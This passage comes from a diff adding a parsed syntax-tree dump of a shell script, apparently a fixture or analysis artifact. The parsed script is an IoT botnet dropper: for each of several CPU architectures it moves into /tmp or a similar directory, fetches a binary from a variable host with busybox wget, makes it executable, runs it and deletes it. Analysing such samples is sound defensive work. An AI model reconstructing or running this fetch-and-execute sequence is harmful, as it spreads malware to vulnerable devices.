+        CommandNode(lineno=28, pos=(1993, 2022), parts=[
+          WordNode(lineno=28, pos=(1993, 2005), word='/bin/busybox'),
+          WordNode(lineno=28, pos=(2006, 2010), word='wget'),
+          WordNode(lineno=28, pos=(2011, 2022), word='$path/$i686', parts=[
+            ParameterNode(lineno=28, pos=(2011, 2016), value='path'),
+            ParameterNode(lineno=28, pos=(2017, 2022), value='i686'),
+          ]),
+        ]),
+        OperatorNode(lineno=28, op=';', pos=(2022, 2023)),
+        CommandNode(lineno=28, pos=(2024, 2056), parts=[
+          WordNode(lineno=28, pos=(2024, 2036), word='/bin/busybox'),
+          WordNode(lineno=28, pos=(2037, 2040), word='cat'),
+          WordNode(lineno=28, pos=(2041, 2046), word='$i686', parts=[
+            ParameterNode(lineno=28, pos=(2041, 2046), value='i686'),
+          ]),
+          RedirectNode(lineno=28, output=
+            WordNode(lineno=28, pos=(2049, 2056), word='busybox'), pos=(2047, 2056), type='>'),
+        ]),
+        OperatorNode(lineno=28, op=';', pos=(2056, 2057)),
+        CommandNode(lineno=28, pos=(2058, 2088), parts=[
+          WordNode(lineno=28, pos=(2058, 2070), word='/bin/busybox'),
+          WordNode(lineno=28, pos=(2071, 2076), word='chmod'),
+          WordNode(lineno=28, pos=(2077, 2080), word='777'),
+          WordNode(lineno=28, pos=(2081, 2088), word='busybox'),
+        ]),
+        OperatorNode(lineno=28, op=';', pos=(2088, 2089)),
+        CommandNode(lineno=28, pos=(2090, 2099), parts=[
+          WordNode(lineno=28, pos=(2090, 2099), word='./busybox'),
+        ]),
+        OperatorNode(lineno=28, op=';', pos=(2099, 2100)),
+        CommandNode(lineno=28, pos=(2101, 2115), parts=[
+          WordNode(lineno=28, pos=(2101, 2103), word='rm'),
+          WordNode(lineno=28, pos=(2104, 2107), word='-rf'),
+          WordNode(lineno=28, pos=(2108, 2115), word='busybox'),
+        ]),
+        OperatorNode(lineno=29, op='\n', pos=(2115, 2116)),
+        CommandNode(lineno=29, pos=(2116, 2123), parts=[
+          WordNode(lineno=29, pos=(2116, 2118), word='cd'),
+          WordNode(lineno=29, pos=(2119, 2123), word='/tmp'),
+        ]),
+        OperatorNode(lineno=29, op='||', pos=(2124, 2126)),
+        CommandNode(lineno=29, pos=(2127, 2138), parts=[
+          WordNode(lineno=29, pos=(2127, 2129), word='cd'),
+          WordNode(lineno=29, pos=(2130, 2138), word='/var/run'),
+        ]),
+        OperatorNode(lineno=29, op='||', pos=(2139, 2141)),
+        CommandNode(lineno=29, pos=(2142, 2153), parts=[
+          WordNode(lineno=29, pos=(2142, 2144), word='cd'),
+          WordNode(lineno=29, pos=(2145, 2153), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=29, op='||', pos=(2154, 2156)),
+        CommandNode(lineno=29, pos=(2157, 2164), parts=[
+          WordNode(lineno=29, pos=(2157, 2159), word='cd'),
+          WordNode(lineno=29, pos=(2160, 2164), word='/mnt'),
+        ]),
+        OperatorNode(lineno=29, op='||', pos=(2165, 2167)),
+        CommandNode(lineno=29, pos=(2168, 2175), parts=[
+          WordNode(lineno=29, pos=(2168, 2170), word='cd'),
+          WordNode(lineno=29, pos=(2171, 2175), word='/var'),
+        ]),
+        OperatorNode(lineno=29, op=';', pos=(2175, 2176)),
+        CommandNode(lineno=29, pos=(2177, 2207), parts=[
+          WordNode(lineno=29, pos=(2177, 2189), word='/bin/busybox'),
+          WordNode(lineno=29, pos=(2190, 2192), word='cp'),
+          WordNode(lineno=29, pos=(2193, 2205), word='/bin/busybox'),
+          WordNode(lineno=29, pos=(2206, 2207), word='.'),
+        ]),
+        OperatorNode(lineno=29, op=';', pos=(2207, 2208)),
+        CommandNode(lineno=29, pos=(2209, 2238), parts=[
+          WordNode(lineno=29, pos=(2209, 2221), word='/bin/busybox'),
+          WordNode(lineno=29, pos=(2222, 2226), word='wget'),
+          WordNode(lineno=29, pos=(2227, 2238), word='$path/$m68k', parts=[
+            ParameterNode(lineno=29, pos=(2227, 2232), value='path'),
+            ParameterNode(lineno=29, pos=(2233, 2238), value='m68k'),
+          ]),
+        ]),
+        OperatorNode(lineno=29, op=';', pos=(2238, 2239)),
+        CommandNode(lineno=29, pos=(2240, 2272), parts=[
+          WordNode(lineno=29, pos=(2240, 2252), word='/bin/busybox'),
+          WordNode(lineno=29, pos=(2253, 2256), word='cat'),
+          WordNode(lineno=29, pos=(2257, 2262), word='$m68k', parts=[
+            ParameterNode(lineno=29, pos=(2257, 2262), value='m68k'),
+          ]),
+          RedirectNode(lineno=29, output=
+            WordNode(lineno=29, pos=(2265, 2272), word='busybox'), pos=(2263, 2272), type='>'),
+        ]),
+        OperatorNode(lineno=29, op=';', pos=(2272, 2273)),
+        CommandNode(lineno=29, pos=(2274, 2304), parts=[
+          WordNode(lineno=29, pos=(2274, 2286), word='/bin/busybox'),
+          WordNode(lineno=29, pos=(2287, 2292), word='chmod'),
+          WordNode(lineno=29, pos=(2293, 2296), word='777'),
+          WordNode(lineno=29, pos=(2297, 2304), word='busybox'),
+        ]),
+        OperatorNode(lineno=29, op=';', pos=(2304, 2305)),
+        CommandNode(lineno=29, pos=(2306, 2315), parts=[
+          WordNode(lineno=29, pos=(2306, 2315), word='./busybox'),
+        ]),
+        OperatorNode(lineno=29, op=';', pos=(2315, 2316)),
+        CommandNode(lineno=29, pos=(2317, 2331), parts=[
+          WordNode(lineno=29, pos=(2317, 2319), word='rm'),
+          WordNode(lineno=29, pos=(2320, 2323), word='-rf'),
+          WordNode(lineno=29, pos=(2324, 2331), word='busybox'),
+        ]),
+        OperatorNode(lineno=30, op='\n', pos=(2331, 2332)),
+        CommandNode(lineno=30, pos=(2332, 2339), parts=[
+          WordNode(lineno=30, pos=(2332, 2334), word='cd'),
+          WordNode(lineno=30, pos=(2335, 2339), word='/tmp'),
+        ]),
+        OperatorNode(lineno=30, op='||', pos=(2340, 2342)),
+        CommandNode(lineno=30, pos=(2343, 2354), parts=[
+          WordNode(lineno=30, pos=(2343, 2345), word='cd'),
+          WordNode(lineno=30, pos=(2346, 2354), word='/var/run'),
+        ]),
+        OperatorNode(lineno=30, op='||', pos=(2355, 2357)),
+        CommandNode(lineno=30, pos=(2358, 2369), parts=[
+          WordNode(lineno=30, pos=(2358, 2360), word='cd'),
+          WordNode(lineno=30, pos=(2361, 2369), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=30, op='||', pos=(2370, 2372)),
+        CommandNode(lineno=30, pos=(2373, 2380), parts=[
+          WordNode(lineno=30, pos=(2373, 2375), word='cd'),
+          WordNode(lineno=30, pos=(2376, 2380), word='/mnt'),
+        ]),
+        OperatorNode(lineno=30, op='||', pos=(2381, 2383)),
+        CommandNode(lineno=30, pos=(2384, 2391), parts=[
+          WordNode(lineno=30, pos=(2384, 2386), word='cd'),
+          WordNode(lineno=30, pos=(2387, 2391), word='/var'),
+        ]),
+        OperatorNode(lineno=30, op=';', pos=(2391, 2392)),
+        CommandNode(lineno=30, pos=(2393, 2423), parts=[
+          WordNode(lineno=30, pos=(2393, 2405), word='/bin/busybox'),
+          WordNode(lineno=30, pos=(2406, 2408), word='cp'),
+          WordNode(lineno=30, pos=(2409, 2421), word='/bin/busybox'),
+          WordNode(lineno=30, pos=(2422, 2423), word='.'),
+        ]),
+        OperatorNode(lineno=30, op=';', pos=(2423, 2424)),
+        CommandNode(lineno=30, pos=(2425, 2453), parts=[
+          WordNode(lineno=30, pos=(2425, 2437), word='/bin/busybox'),
+          WordNode(lineno=30, pos=(2438, 2442), word='wget'),
+          WordNode(lineno=30, pos=(2443, 2453), word='$path/$sh4', parts=[
+            ParameterNode(lineno=30, pos=(2443, 2448), value='path'),
+            ParameterNode(lineno=30, pos=(2449, 2453), value='sh4'),
+          ]),
+        ]),
+        OperatorNode(lineno=30, op=';', pos=(2453, 2454)),
+        CommandNode(lineno=30, pos=(2455, 2486), parts=[
+          WordNode(lineno=30, pos=(2455, 2467), word='/bin/busybox'),
+          WordNode(lineno=30, pos=(2468, 2471), word='cat'),
+          WordNode(lineno=30, pos=(2472, 2476), word='$sh4', parts=[
+            ParameterNode(lineno=30, pos=(2472, 2476), value='sh4'),
+          ]),
+          RedirectNode(lineno=30, output=
+            WordNode(lineno=30, pos=(2479, 2486), word='busybox'), pos=(2477, 2486), type='>'),
+        ]),
+        OperatorNode(lineno=30, op=';', pos=(2486, 2487)),
+        CommandNode(lineno=30, pos=(2488, 2518), parts=[
+          WordNode(lineno=30, pos=(2488, 2500), word='/bin/busybox'),
+          WordNode(lineno=30, pos=(2501, 2506), word='chmod'),
+          WordNode(lineno=30, pos=(2507, 2510), word='777'),
+          WordNode(lineno=30, pos=(2511, 2518), word='busybox'),
+        ]),
+        OperatorNode(lineno=30, op=';', pos=(2518, 2519)),
+        CommandNode(lineno=30, pos=(2520, 2529), parts=[
+          WordNode(lineno=30, pos=(2520, 2529), word='./busybox'),
+        ]),
+        OperatorNode(lineno=30, op=';', pos=(2529, 2530)),
+        CommandNode(lineno=30, pos=(2531, 2545), parts=[
+          WordNode(lineno=30, pos=(2531, 2533), word='rm'),
+          WordNode(lineno=30, pos=(2534, 2537), word='-rf'),
+          WordNode(lineno=30, pos=(2538, 2545), word='busybox'),
+        ]),
+        OperatorNode(lineno=31, op='\n', pos=(2545, 2546)),
+        CommandNode(lineno=31, pos=(2546, 2553), parts=[
+          WordNode(lineno=31, pos=(2546, 2548), word='cd'),
+          WordNode(lineno=31, pos=(2549, 2553), word='/tmp'),
+        ]),
+        OperatorNode(lineno=31, op='||', pos=(2554, 2556)),
+        CommandNode(lineno=31, pos=(2557, 2568), parts=[
+          WordNode(lineno=31, pos=(2557, 2559), word='cd'),
+          WordNode(lineno=31, pos=(2560, 2568), word='/var/run'),
+        ]),
+        OperatorNode(lineno=31, op='||', pos=(2569, 2571)),
+        CommandNode(lineno=31, pos=(2572, 2583), parts=[
+          WordNode(lineno=31, pos=(2572, 2574), word='cd'),
+          WordNode(lineno=31, pos=(2575, 2583), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=31, op='||', pos=(2584, 2586)),
+        CommandNode(lineno=31, pos=(2587, 2594), parts=[
+          WordNode(lineno=31, pos=(2587, 2589), word='cd'),
+          WordNode(lineno=31, pos=(2590, 2594), word='/mnt'),
+        ]),
+        OperatorNode(lineno=31, op='||', pos=(2595, 2597)),
+        CommandNode(lineno=31, pos=(2598, 2605), parts=[
+          WordNode(lineno=31, pos=(2598, 2600), word='cd'),
+          WordNode(lineno=31, pos=(2601, 2605), word='/var'),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(2605, 2606)),
+        CommandNode(lineno=31, pos=(2607, 2637), parts=[
+          WordNode(lineno=31, pos=(2607, 2619), word='/bin/busybox'),
+          WordNode(lineno=31, pos=(2620, 2622), word='cp'),
+          WordNode(lineno=31, pos=(2623, 2635), word='/bin/busybox'),
+          WordNode(lineno=31, pos=(2636, 2637), word='.'),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(2637, 2638)),
+        CommandNode(lineno=31, pos=(2639, 2671), parts=[
+          WordNode(lineno=31, pos=(2639, 2651), word='/bin/busybox'),
+          WordNode(lineno=31, pos=(2652, 2656), word='wget'),
+          WordNode(lineno=31, pos=(2657, 2671), word='$path/$powerpc', parts=[
+            ParameterNode(lineno=31, pos=(2657, 2662), value='path'),
+            ParameterNode(lineno=31, pos=(2663, 2671), value='powerpc'),
+          ]),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(2671, 2672)),
+        CommandNode(lineno=31, pos=(2673, 2708), parts=[
+          WordNode(lineno=31, pos=(2673, 2685), word='/bin/busybox'),
+          WordNode(lineno=31, pos=(2686, 2689), word='cat'),
+          WordNode(lineno=31, pos=(2690, 2698), word='$powerpc', parts=[
+            ParameterNode(lineno=31, pos=(2690, 2698), value='powerpc'),
+          ]),
+          RedirectNode(lineno=31, output=
+            WordNode(lineno=31, pos=(2701, 2708), word='busybox'), pos=(2699, 2708), type='>'),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(2708, 2709)),
+        CommandNode(lineno=31, pos=(2710, 2740), parts=[
+          WordNode(lineno=31, pos=(2710, 2722), word='/bin/busybox'),
+          WordNode(lineno=31, pos=(2723, 2728), word='chmod'),
+          WordNode(lineno=31, pos=(2729, 2732), word='777'),
+          WordNode(lineno=31, pos=(2733, 2740), word='busybox'),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(2740, 2741)),
+        CommandNode(lineno=31, pos=(2742, 2751), parts=[
+          WordNode(lineno=31, pos=(2742, 2751), word='./busybox'),
+        ]),
+        OperatorNode(lineno=31, op=';', pos=(2751, 2752)),
+        CommandNode(lineno=31, pos=(2753, 2767), parts=[
+          WordNode(lineno=31, pos=(2753, 2755), word='rm'),
+          WordNode(lineno=31, pos=(2756, 2759), word='-rf'),
+          WordNode(lineno=31, pos=(2760, 2767), word='busybox'),
+        ]),
+        OperatorNode(lineno=32, op='\n', pos=(2767, 2768)),
+        CommandNode(lineno=32, pos=(2768, 2775), parts=[
+          WordNode(lineno=32, pos=(2768, 2770), word='cd'),
+          WordNode(lineno=32, pos=(2771, 2775), word='/tmp'),
+        ]),
+        OperatorNode(lineno=32, op='||', pos=(2776, 2778)),
+        CommandNode(lineno=32, pos=(2779, 2790), parts=[
+          WordNode(lineno=32, pos=(2779, 2781), word='cd'),
+          WordNode(lineno=32, pos=(2782, 2790), word='/var/run'),
+        ]),
+        OperatorNode(lineno=32, op='||', pos=(2791, 2793)),
+        CommandNode(lineno=32, pos=(2794, 2805), parts=[
+          WordNode(lineno=32, pos=(2794, 2796), word='cd'),
+          WordNode(lineno=32, pos=(2797, 2805), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=32, op='||', pos=(2806, 2808)),
+        CommandNode(lineno=32, pos=(2809, 2816), parts=[
+          WordNode(lineno=32, pos=(2809, 2811), word='cd'),
+          WordNode(lineno=32, pos=(2812, 2816), word='/mnt'),
+        ]),
+        OperatorNode(lineno=32, op='||', pos=(2817, 2819)),
+        CommandNode(lineno=32, pos=(2820, 2827), parts=[
+          WordNode(lineno=32, pos=(2820, 2822), word='cd'),
+          WordNode(lineno=32, pos=(2823, 2827), word='/var'),
+        ]),
+        OperatorNode(lineno=32, op=';', pos=(2827, 2828)),
+        CommandNode(lineno=32, pos=(2829, 2859), parts=[
+          WordNode(lineno=32, pos=(2829, 2841), word='/bin/busybox'),
+          WordNode(lineno=32, pos=(2842, 2844), word='cp'),
+          WordNode(lineno=32, pos=(2845, 2857), word='/bin/busybox'),
+          WordNode(lineno=32, pos=(2858, 2859), word='.'),
+        ]),
+        OperatorNode(lineno=32, op=';', pos=(2859, 2860)),
+        CommandNode(lineno=32, pos=(2861, 2898), parts=[
+          WordNode(lineno=32, pos=(2861, 2873), word='/bin/busybox'),
+          WordNode(lineno=32, pos=(2874, 2878), word='wget'),
+          WordNode(lineno=32, pos=(2879, 2898), word='$path/$powerpc440fp', parts=[
+            ParameterNode(lineno=32, pos=(2879, 2884), value='path'),
+            ParameterNode(lineno=32, pos=(2885, 2898), value='powerpc440fp'),
+          ]),
+        ]),
+        OperatorNode(lineno=32, op=';', pos=(2898, 2899)),
+        CommandNode(lineno=32, pos=(2900, 2940), parts=[
+          WordNode(lineno=32, pos=(2900, 2912), word='/bin/busybox'),
+          WordNode(lineno=32, pos=(2913, 2916), word='cat'),
+          WordNode(lineno=32, pos=(2917, 2930), word='$powerpc440fp', parts=[
+            ParameterNode(lineno=32, pos=(2917, 2930), value='powerpc440fp'),
+          ]),
+          RedirectNode(lineno=32, output=
+            WordNode(lineno=32, pos=(2933, 2940), word='busybox'), pos=(2931, 2940), type='>'),
+        ]),
+        OperatorNode(lineno=32, op=';', pos=(2940, 2941)),
+        CommandNode(lineno=32, pos=(2942, 2972), parts=[
+          WordNode(lineno=32, pos=(2942, 2954), word='/bin/busybox'),
+          WordNode(lineno=32, pos=(2955, 2960), word='chmod'),
+          WordNode(lineno=32, pos=(2961, 2964), word='777'),
+          WordNode(lineno=32, pos=(2965, 2972), word='busybox'),
+        ]),
+        OperatorNode(lineno=32, op=';', pos=(2972, 2973)),
+        CommandNode(lineno=32, pos=(2974, 2983), parts=[
+          WordNode(lineno=32, pos=(2974, 2983), word='./busybox'),
+        ]),
+        OperatorNode(lineno=32, op=';', pos=(2983, 2984)),
+        CommandNode(lineno=32, pos=(2985, 2999), parts=[
+          WordNode(lineno=32, pos=(2985, 2987), word='rm'),
+          WordNode(lineno=32, pos=(2988, 2991), word='-rf'),
+          WordNode(lineno=32, pos=(2992, 2999), word='busybox'),
+        ]),
+        OperatorNode(lineno=33, op='\n', pos=(2999, 3000)),
+        CommandNode(lineno=33, pos=(3000, 3007), parts=[
+          WordNode(lineno=33, pos=(3000, 3002), word='cd'),
+          WordNode(lineno=33, pos=(3003, 3007), word='/tmp'),
+        ]),
+        OperatorNode(lineno=33, op='||', pos=(3008, 3010)),
+        CommandNode(lineno=33, pos=(3011, 3022), parts=[
+          WordNode(lineno=33, pos=(3011, 3013), word='cd'),
+          WordNode(lineno=33, pos=(3014, 3022), word='/var/run'),
+        ]),
+        OperatorNode(lineno=33, op='||', pos=(3023, 3025)),
+        CommandNode(lineno=33, pos=(3026, 3037), parts=[
+          WordNode(lineno=33, pos=(3026, 3028), word='cd'),
+          WordNode(lineno=33, pos=(3029, 3037), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=33, op='||', pos=(3038, 3040)),
+        CommandNode(lineno=33, pos=(3041, 3048), parts=[
+          WordNode(lineno=33, pos=(3041, 3043), word='cd'),
+          WordNode(lineno=33, pos=(3044, 3048), word='/mnt'),
+        ]),
+        OperatorNode(lineno=33, op='||', pos=(3049, 3051)),
+        CommandNode(lineno=33, pos=(3052, 3059), parts=[
+          WordNode(lineno=33, pos=(3052, 3054), word='cd'),
+          WordNode(lineno=33, pos=(3055, 3059), word='/var'),
+        ]),
+        OperatorNode(lineno=33, op=';', pos=(3059, 3060)),
+        CommandNode(lineno=33, pos=(3061, 3091), parts=[
+          WordNode(lineno=33, pos=(3061, 3073), word='/bin/busybox'),
+          WordNode(lineno=33, pos=(3074, 3076), word='cp'),
+          WordNode(lineno=33, pos=(3077, 3089), word='/bin/busybox'),
+          WordNode(lineno=33, pos=(3090, 3091), word='.'),
+        ]),
+        OperatorNode(lineno=33, op=';', pos=(3091, 3092)),
+        CommandNode(lineno=33, pos=(3093, 3124), parts=[
+          WordNode(lineno=33, pos=(3093, 3105), word='/bin/busybox'),
+          WordNode(lineno=33, pos=(3106, 3110), word='wget'),
+          WordNode(lineno=33, pos=(3111, 3124), word='$path/$x86_64', parts=[
+            ParameterNode(lineno=33, pos=(3111, 3116), value='path'),
+            ParameterNode(lineno=33, pos=(3117, 3124), value='x86_64'),
+          ]),
+        ]),
+        OperatorNode(lineno=33, op=';', pos=(3124, 3125)),
+        CommandNode(lineno=33, pos=(3126, 3160), parts=[
+          WordNode(lineno=33, pos=(3126, 3138), word='/bin/busybox'),
+          WordNode(lineno=33, pos=(3139, 3142), word='cat'),
+          WordNode(lineno=33, pos=(3143, 3150), word='$x86_64', parts=[
+            ParameterNode(lineno=33, pos=(3143, 3150), value='x86_64'),
+          ]),
+          RedirectNode(lineno=33, output=
+            WordNode(lineno=33, pos=(3153, 3160), word='busybox'), pos=(3151, 3160), type='>'),
+        ]),
+        OperatorNode(lineno=33, op=';', pos=(3160, 3161)),
+        CommandNode(lineno=33, pos=(3162, 3192), parts=[
+          WordNode(lineno=33, pos=(3162, 3174), word='/bin/busybox'),
+          WordNode(lineno=33, pos=(3175, 3180), word='chmod'),
+          WordNode(lineno=33, pos=(3181, 3184), word='777'),
+          WordNode(lineno=33, pos=(3185, 3192), word='busybox'),
+        ]),
+        OperatorNode(lineno=33, op=';', pos=(3192, 3193)),
+        CommandNode(lineno=33, pos=(3194, 3203), parts=[
+          WordNode(lineno=33, pos=(3194, 3203), word='./busybox'),
+        ]),
+        OperatorNode(lineno=33, op=';', pos=(3203, 3204)),
+        CommandNode(lineno=33, pos=(3205, 3219), parts=[
+          WordNode(lineno=33, pos=(3205, 3207), word='rm'),
+          WordNode(lineno=33, pos=(3208, 3211), word='-rf'),
+          WordNode(lineno=33, pos=(3212, 3219), word='busybox'),
+        ]),
+        OperatorNode(lineno=34, op='\n', pos=(3219, 3220)),
+      ]),
+    ReservedwordNode(lineno=34, pos=(3220, 3224), word='else'),
+    ListNode(lineno=48, pos=(3225, 4847), parts=[
+        CommandNode(lineno=35, pos=(3225, 3232), parts=[
+          WordNode(lineno=35, pos=(3225, 3227), word='cd'),
+          WordNode(lineno=35, pos=(3228, 3232), word='/tmp'),
+        ]),
+        OperatorNode(lineno=35, op='||', pos=(3233, 3235)),
+        CommandNode(lineno=35, pos=(3236, 3247), parts=[
+          WordNode(lineno=35, pos=(3236, 3238), word='cd'),
+          WordNode(lineno=35, pos=(3239, 3247), word='/var/run'),
+        ]),
+        OperatorNode(lineno=35, op='||', pos=(3248, 3250)),
+        CommandNode(lineno=35, pos=(3251, 3262), parts=[
+          WordNode(lineno=35, pos=(3251, 3253), word='cd'),
+          WordNode(lineno=35, pos=(3254, 3262), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=35, op='||', pos=(3263, 3265)),
+        CommandNode(lineno=35, pos=(3266, 3273), parts=[
+          WordNode(lineno=35, pos=(3266, 3268), word='cd'),
+          WordNode(lineno=35, pos=(3269, 3273), word='/mnt'),
+        ]),
+        OperatorNode(lineno=35, op='||', pos=(3274, 3276)),
+        CommandNode(lineno=35, pos=(3277, 3284), parts=[
+          WordNode(lineno=35, pos=(3277, 3279), word='cd'),
+          WordNode(lineno=35, pos=(3280, 3284), word='/var'),
+        ]),
+        OperatorNode(lineno=35, op=';', pos=(3284, 3285)),
+        CommandNode(lineno=35, pos=(3286, 3302), parts=[
+          WordNode(lineno=35, pos=(3286, 3290), word='wget'),
+          WordNode(lineno=35, pos=(3291, 3302), word='$path/$mips', parts=[
+            ParameterNode(lineno=35, pos=(3291, 3296), value='path'),
+            ParameterNode(lineno=35, pos=(3297, 3302), value='mips'),
+          ]),
+        ]),
+        OperatorNode(lineno=35, op=';', pos=(3302, 3303)),
+        CommandNode(lineno=35, pos=(3304, 3319), parts=[
+          WordNode(lineno=35, pos=(3304, 3309), word='chmod'),
+          WordNode(lineno=35, pos=(3310, 3313), word='777'),
+          WordNode(lineno=35, pos=(3314, 3319), word='$mips', parts=[
+            ParameterNode(lineno=35, pos=(3314, 3319), value='mips'),
+          ]),
+        ]),
+        OperatorNode(lineno=35, op=';', pos=(3319, 3320)),
+        CommandNode(lineno=35, pos=(3321, 3328), parts=[
+          WordNode(lineno=35, pos=(3321, 3328), word='./$mips', parts=[
+            ParameterNode(lineno=35, pos=(3323, 3328), value='mips'),
+          ]),
+        ]),
+        OperatorNode(lineno=35, op=';', pos=(3328, 3329)),
+        CommandNode(lineno=35, pos=(3330, 3342), parts=[
+          WordNode(lineno=35, pos=(3330, 3332), word='rm'),
+          WordNode(lineno=35, pos=(3333, 3336), word='-rf'),
+          WordNode(lineno=35, pos=(3337, 3342), word='$mips', parts=[
+            ParameterNode(lineno=35, pos=(3337, 3342), value='mips'),
+          ]),
+        ]),
+        OperatorNode(lineno=36, op='\n', pos=(3342, 3343)),
+        CommandNode(lineno=36, pos=(3343, 3350), parts=[
+          WordNode(lineno=36, pos=(3343, 3345), word='cd'),
+          WordNode(lineno=36, pos=(3346, 3350), word='/tmp'),
+        ]),
+        OperatorNode(lineno=36, op='||', pos=(3351, 3353)),
+        CommandNode(lineno=36, pos=(3354, 3365), parts=[
+          WordNode(lineno=36, pos=(3354, 3356), word='cd'),
+          WordNode(lineno=36, pos=(3357, 3365), word='/var/run'),
+        ]),
+        OperatorNode(lineno=36, op='||', pos=(3366, 3368)),
+        CommandNode(lineno=36, pos=(3369, 3380), parts=[
+          WordNode(lineno=36, pos=(3369, 3371), word='cd'),
+          WordNode(lineno=36, pos=(3372, 3380), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=36, op='||', pos=(3381, 3383)),
+        CommandNode(lineno=36, pos=(3384, 3391), parts=[
+          WordNode(lineno=36, pos=(3384, 3386), word='cd'),
+          WordNode(lineno=36, pos=(3387, 3391), word='/mnt'),
+        ]),
+        OperatorNode(lineno=36, op='||', pos=(3392, 3394)),
+        CommandNode(lineno=36, pos=(3395, 3402), parts=[
+          WordNode(lineno=36, pos=(3395, 3397), word='cd'),
+          WordNode(lineno=36, pos=(3398, 3402), word='/var'),
+        ]),
+        OperatorNode(lineno=36, op=';', pos=(3402, 3403)),
+        CommandNode(lineno=36, pos=(3404, 3422), parts=[
+          WordNode(lineno=36, pos=(3404, 3408), word='wget'),
+          WordNode(lineno=36, pos=(3409, 3422), word='$path/$mipsel', parts=[
+            ParameterNode(lineno=36, pos=(3409, 3414), value='path'),
+            ParameterNode(lineno=36, pos=(3415, 3422), value='mipsel'),
+          ]),
+        ]),
+        OperatorNode(lineno=36, op=';', pos=(3422, 3423)),
+        CommandNode(lineno=36, pos=(3424, 3441), parts=[
+          WordNode(lineno=36, pos=(3424, 3429), word='chmod'),
+          WordNode(lineno=36, pos=(3430, 3433), word='777'),
+          WordNode(lineno=36, pos=(3434, 3441), word='$mipsel', parts=[
+            ParameterNode(lineno=36, pos=(3434, 3441), value='mipsel'),
+          ]),
+        ]),
+        OperatorNode(lineno=36, op=';', pos=(3441, 3442)),
+        CommandNode(lineno=36, pos=(3443, 3452), parts=[
+          WordNode(lineno=36, pos=(3443, 3452), word='./$mipsel', parts=[
+            ParameterNode(lineno=36, pos=(3445, 3452), value='mipsel'),
+          ]),
+        ]),
+        OperatorNode(lineno=36, op=';', pos=(3452, 3453)),
+        CommandNode(lineno=36, pos=(3454, 3468), parts=[
+          WordNode(lineno=36, pos=(3454, 3456), word='rm'),
+          WordNode(lineno=36, pos=(3457, 3460), word='-rf'),
+          WordNode(lineno=36, pos=(3461, 3468), word='$mipsel', parts=[
+            ParameterNode(lineno=36, pos=(3461, 3468), value='mipsel'),
+          ]),
+        ]),
+        OperatorNode(lineno=37, op='\n', pos=(3468, 3469)),
+        CommandNode(lineno=37, pos=(3469, 3476), parts=[
+          WordNode(lineno=37, pos=(3469, 3471), word='cd'),
+          WordNode(lineno=37, pos=(3472, 3476), word='/tmp'),
+        ]),
+        OperatorNode(lineno=37, op='||', pos=(3477, 3479)),
+        CommandNode(lineno=37, pos=(3480, 3491), parts=[
+          WordNode(lineno=37, pos=(3480, 3482), word='cd'),
+          WordNode(lineno=37, pos=(3483, 3491), word='/var/run'),
+        ]),
+        OperatorNode(lineno=37, op='||', pos=(3492, 3494)),
+        CommandNode(lineno=37, pos=(3495, 3506), parts=[
+          WordNode(lineno=37, pos=(3495, 3497), word='cd'),
+          WordNode(lineno=37, pos=(3498, 3506), word='/dev/shm'),
+        ]),
+        OperatorNode(lineno=37, op='||', pos=(3507, 3509)),
+        CommandNode(lineno=37, pos=(3510, 3517), parts=[
+          WordNode(lineno=37, pos=(3510, 3512), word='cd'),
+          WordNode(lineno=37, pos=(3513, 3517), word='/mnt'),
+        ]),
+        OperatorNode(lineno=37, op='||', pos=(3518, 3520)),
+        CommandNode(lineno=37, pos=(3521, 3528), parts=[
+          WordNode(lineno=37, pos=(3521, 3523), word='cd'),
+          WordNode(lineno=37, pos=(3524, 3528), word='/var'),
+        ]),
+        OperatorNode(lineno=37, op=';', pos=(3528, 3529)),
+        CommandNode(lineno=37, pos=(3530, 3548), parts=[
+          WordNode(lineno=37, pos=(3530, 3534), word='wget'),
+          WordNode(lineno=37, pos=(3535, 3548), word='$path/$armv4l', parts=[
+            ParameterNode(lineno=37, pos=(3535, 3540), value='path'),
+            ParameterNode(lineno=37, pos=(3541, 3548), value='armv4l'),
+          ]),
+        ]),
+        OperatorNode(lineno=37, op=';', pos=(3548, 3549)),
+        CommandNode(lineno=37, pos=(3550, 3567), parts=[
+          WordNode(lineno=37, pos=(3550, 3555), word='chmod'),
+          WordNode(lineno=37, pos=(3556, 3559), word='777'),
+          WordNode(lineno=37, pos=(3560, 3567), word='$armv4l', parts=[
+            ParameterNode(lineno=37, pos=(3560, 3567), value='armv4l'),
+          ]),
+        ]),
+        OperatorNode(lineno=37, op=';', pos=(3567, 3568)),
+        CommandNode(lineno=37, pos=(3569, 3578), parts=[
+          WordNode(lineno=37, pos=(3569, 3578), word='./$armv4l', parts=[
+            ParameterNode(lineno=37, pos=(3571, 3578), value='armv4l'),
+          ]),
+        ]),
+        OperatorNode(lineno=37, op=';', pos=(3578, 3579)),
+        CommandNode(lineno=37, pos=(3580, 3594), parts=[
+          WordNode(lineno=37, pos=(3580, 3582), word='rm'),
+          WordNode(lineno=37, pos=(3583, 3586), word='-rf'),
+          WordNode(lineno=37, pos=(3587, 3594), word='$armv4l', parts=[
+            ParameterNode(lineno=37, pos=(3587, 3594), value='armv4l'),
+          ]),
+        ]),
+        OperatorNode(lineno=38, op='\n', pos=(3594, 3595)),
+        CommandNode(lineno=38, pos=(3595, 3602), parts=[
+          WordNode(lineno=38, pos=(3595, 3597), word='cd'),
+          WordNode(lineno=38, pos=(3598, 3602), word='/tmp'),
+        ]),
+        OperatorNode(lineno=38, op='||', pos=(3603, 3605)),
+        CommandNode(lineno=38, pos=(3606, 3617), parts=[
+          WordNode(lineno=38, pos=(3606, 3608), word='cd'),
+          WordNode(lineno=38, pos=(3609, 3617), word='/var/run'),
+        ]),
+        OperatorNode(lineno=38, op='||', pos=(3618, 3620)),
+        CommandNode(lineno=38, pos=(3621, 3632), parts=[
+          WordNode(lineno=38, pos=(3621, 3623), word='cd'),
+          WordNode(lineno=38, pos=(3624, 3632), word='/dev/shm'),
+        ]),
